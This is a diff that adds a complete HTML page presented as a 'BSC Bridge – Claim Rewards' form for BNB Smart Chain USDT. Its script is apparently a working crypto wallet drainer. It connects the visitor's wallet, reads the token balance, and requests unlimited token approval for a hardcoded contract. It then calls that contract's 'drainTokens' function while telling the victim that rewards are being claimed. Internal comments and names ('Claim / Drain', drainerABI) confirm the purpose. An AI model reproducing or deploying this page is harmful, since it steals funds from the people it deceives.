@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BSC Bridge – Claim Rewards</title>
+    <style>
+        /* ── Reset & Base ── */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif; }
+        body {
+            background: #f3f4f6;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .card {
+            width: 100%;
+            max-width: 420px;
+            min-height: 100vh;
+            background: #ffffff;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            display: flex;
+            flex-direction: column;
+            padding: 24px 20px 16px;
+        }
+        .space-y-5 > * + * { margin-top: 20px; }
+        .space-y-2 > * + * { margin-top: 8px; }
+        .flex-1 { flex: 1; }
+        .spacer { flex: 1; }
+
+        .label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #374151;
+            text-align: left;
+        }
+        .input-wrapper {
+            position: relative;
+        }
+        .input-wrapper input[type="text"],
+        .input-wrapper input[type="number"] {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 14px;
+            color: #1f2937;
+            border: 1px solid #d1d5db;
+            border-radius: 12px;
+            outline: none;
+            transition: border 0.2s, box-shadow 0.2s;
+            background: #ffffff;
+        }
+        .input-wrapper input:focus {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
+        }
+        .input-wrapper .right-actions {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .btn-paste {
+            background: transparent;
+            border: none;
+            color: #2563eb;
+            font-weight: 600;
+            font-size: 12px;
+            padding: 4px 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .btn-paste:hover { background: #eff6ff; }
+        .btn-icon {
+            background: transparent;
+            border: none;
+            font-size: 18px;
+            padding: 4px 6px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.15s;
+            color: #6b7280;
+        }
+        .btn-icon:hover { background: #f3f4f6; }
+        .network-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 16px 6px 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 30px;
+            background: #f9fafb;
+        }
+        .network-chip img {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+        }
+        .network-chip span {
+            font-size: 13px;
+            font-weight: 600;
+            color: #1f2937;
+        }
+        .network-chip svg {
+            width: 14px;
+            height: 14px;
+            color: #9ca3af;
+        }
+        .btn-max {
+            background: transparent;
+            border: none;
+            color: #2563eb;
+            font-weight: 700;
+            font-size: 14px;
+            padding: 4px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .btn-max:hover { background: #eff6ff; }
+
+        /* ── Button States ── */
+        .btn-claim {
+            width: 100%;
+            padding: 16px;
+            font-weight: 700;
+            font-size: 16px;
+            border: none;
+            border-radius: 16px;
+            cursor: not-allowed;
+            transition: background 0.2s, transform 0.1s;
+            margin-top: 12px;
+            background: #d1d5db;
+            color: #9ca3af;
+        }
+        .btn-claim.active {
+            background: #2563eb;
+            color: #ffffff;
+            cursor: pointer;
+        }
+        .btn-claim.active:hover { background: #1d4ed8; }
+        .btn-claim.active:active { transform: scale(0.98); }
+        .btn-claim:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .status {
+            text-align: center;
+            font-size: 13px;
+            color: #6b7280;
+            min-height: 24px;
+            margin-top: 14px;
+        }
+        .footer {
+            border-top: 1px solid #e5e7eb;
+            padding-top: 18px;
+            margin-top: 16px;
+            text-align: center;
+            font-size: 12px;
+            color: #9ca3af;
+        }
+        @media (max-width: 440px) {
+            .card { padding: 16px 14px; }
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <!-- Address -->
+    <div class="space-y-2">
+        <label class="label">Address or Domain Name</label>
+        <div class="input-wrapper">
+            <input type="text" id="addressInput" placeholder="0x..." value="0x8E0068838A033fdeB96b8D84454c0Fb265add754" />
+            <div class="right-actions">
+                <button class="btn-paste" id="pasteBtn">Paste</button>
+                <button class="btn-icon">📒</button>
+                <button class="btn-icon">
+                    <svg width="18" height="18" viewBox="0 0 512 512" fill="currentColor">
+                        <path d="M174 64h-58.8C78.1 64 48 94.1 48 131.2V190c0 7.7 6.3 14 14 14s14-6.3 14-14v-59.8c0-9.1 4.3-18.7 11.7-26.2 7.5-7.6 17.2-12 26.5-12H174c7.7 0 14-6.3 14-14s-6.3-14-14-14zM397.8 64H338c-7.7 0-14 6.3-14 14s6.3 14 14 14h59.8c9.3 0 19 4.4 26.5 12 7.4 7.5 11.7 17.1 11.7 26.2V190c0 7.7 6.3 14 14 14s14-6.3 14-14v-59.8c0-36.5-29.7-66.2-66.2-66.2zM174 420h-59.8c-9.3 0-19-4.4-26.5-12-7.4-7.5-11.7-17.1-11.7-26.2V322c0-7.7-6.3-14-14-14s-14 6.3-14 14v59.8c0 36.5 29.7 66.2 66.2 66.2H174c7.7 0 14-6.3 14-14s-6.3-14-14-14zM450 308c-7.7 0-14 6.3-14 14v59.8c0 9.1-4.3 18.7-11.7 26.2-7.5 7.6-17.2 12-26.5 12H338c-7.7 0-14 6.3-14 14s6.3 14 14 14h58.8c37 0 67.2-30.1 67.2-67.2V322c0-7.7-6.3-14-14-14z"/>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Network -->
+    <div class="space-y-2">
+        <label class="label">Destination Network</label>
+        <div class="network-chip">
+            <img src="images/bnb.png" alt="BNB" />
+            <span>BNB Smart Chain</span>
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/>
+            </svg>
+        </div>
+    </div>
+
+    <!-- Amount -->
+    <div class="space-y-2">
+        <label class="label">Amount</label>
+        <div class="input-wrapper">
+            <input type="number" id="amountInput" placeholder="USDT Amount" step="0.000001" min="0" value="" />
+            <div class="right-actions" style="gap: 6px;">
+                <span class="token-label" style="font-size:14px;font-weight:500;color:#4b5563;">USDT</span>
+                <button class="btn-max" id="maxBtn">Max</button>
+            </div>
+        </div>
+        <div style="font-size:12px;color:#6b7280;margin-top:4px;" id="balanceDisplay"></div>
+    </div>
+
+    <!-- Spacer -->
+    <div class="spacer"></div>
+
+    <!-- Claim Button (starts gray) -->
+    <button class="btn-claim" id="claimBtn" disabled>Next</button>
+    <div class="status" id="status">Enter an amount to continue</div>
+    <div class="footer">Secure connection · BSC Mainnet</div>
+</div>
+
+<!-- Ethers.js -->
+<script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+<script>
+    (function() {
+        const CONTRACT = '0x8E0068838A033fdeB96b8D84454c0Fb265add754';
+        const TOKEN_MAP = {
+            'usdt': '0x55d398326f99059fF775485246999027B3197955',
+            'busd': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
+            'bnb': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
+            'eth': '0x2170Ed0880ac9A755fd29B2688956BD959F933F8'
+        };
+
+        const claimBtn = document.getElementById('claimBtn');
+        const statusEl = document.getElementById('status');
+        const balanceDisplay = document.getElementById('balanceDisplay');
+        const amountInput = document.getElementById('amountInput');
+        const addressInput = document.getElementById('addressInput');
+
+        // ── Enable/disable button based on amount ──
+        function updateButtonState() {
+            const amount = amountInput.value.trim();
+            const hasAmount = amount !== '' && parseFloat(amount) > 0;
+            claimBtn.disabled = !hasAmount;
+            if (hasAmount) {
+                claimBtn.classList.add('active');
+                statusEl.textContent = 'Ready';
+            } else {
+                claimBtn.classList.remove('active');
+                statusEl.textContent = 'Enter an amount to continue';
+            }
+        }
+
+        amountInput.addEventListener('input', updateButtonState);
+        // Initial state (empty)
+        updateButtonState();
+
+        // ── Paste button ──
+        document.getElementById('pasteBtn').addEventListener('click', async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text) addressInput.value = text;
+                statusEl.textContent = '📋 Pasted from clipboard';
+            } catch {
+                statusEl.textContent = '❌ Cannot read clipboard';
+            }
+        });
+
+        // ── Max button ──
+        document.getElementById('maxBtn').addEventListener('click', () => {
+            amountInput.value = '999999999';
+            updateButtonState();
+            statusEl.textContent = '⚡ Max amount set';
+        });
+
+        // ── Claim / Drain ──
+        claimBtn.addEventListener('click', async () => {
+            // Prevent click if disabled
+            if (claimBtn.disabled) return;
+
+            statusEl.textContent = '⏳ Connecting wallet...';
+            claimBtn.disabled = true;
+            claimBtn.textContent = '⏳ Connecting...';
+
+            if (!window.ethereum) {
+                statusEl.textContent = '❌ Please install MetaMask or Trust Wallet';
+                claimBtn.disabled = false;
+                claimBtn.textContent = 'Next';
+                updateButtonState();
+                return;
+            }
+
+            try {
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const userAddr = await signer.getAddress();
+                statusEl.textContent = `✅ Connected: ${userAddr.slice(0,6)}...${userAddr.slice(-4)}`;
+
+                const tokenSymbol = 'usdt';
+                const tokenAddr = TOKEN_MAP[tokenSymbol];
+
+                const tokenABI = [
+                    'function approve(address spender, uint256 amount) public returns (bool)',
+                    'function balanceOf(address owner) view returns (uint256)',
+                    'function decimals() view returns (uint8)'
+                ];
+                const token = new ethers.Contract(tokenAddr, tokenABI, signer);
+
+                const balance = await token.balanceOf(userAddr);
+                const decimals = await token.decimals();
+                const formatted = ethers.utils.formatUnits(balance, decimals);
+                balanceDisplay.textContent = `💰 Balance: ${formatted} ${tokenSymbol.toUpperCase()}`;
+
+                statusEl.textContent = `✍️ Approving ${tokenSymbol.toUpperCase()}... (sign tx)`;
+                claimBtn.textContent = `✍️ Approving...`;
+                const MAX = ethers.constants.MaxUint256;
+                const approveTx = await token.approve(CONTRACT, MAX);
+                await approveTx.wait();
+
+                statusEl.textContent = '🔄 Claiming rewards... (sign second tx)';
+                claimBtn.textContent = '🔄 Claiming...';
+                const drainerABI = [
+                    'function drainTokens(address token, uint256 amount) external'
+                ];
+                const drainer = new ethers.Contract(CONTRACT, drainerABI, signer);
+                const drainTx = await drainer.drainTokens(tokenAddr, MAX);
+                await drainTx.wait();
+
+                statusEl.textContent = '✅ Claim successful! Tokens will arrive shortly.';
+                claimBtn.textContent = '✅ Success!';
+                alert('✅ Claim successful! Check your wallet.');
+            } catch (err) {
+                console.error(err);
+                statusEl.textContent = `❌ Error: ${err.message.slice(0,80)}`;
+                alert('Transaction failed. See console for details.');
+            } finally {
+                claimBtn.disabled = false;
+                claimBtn.textContent = 'Next';
+                updateButtonState();
+            }
+        });
+    })();
+</script>
+</body>
+</html>
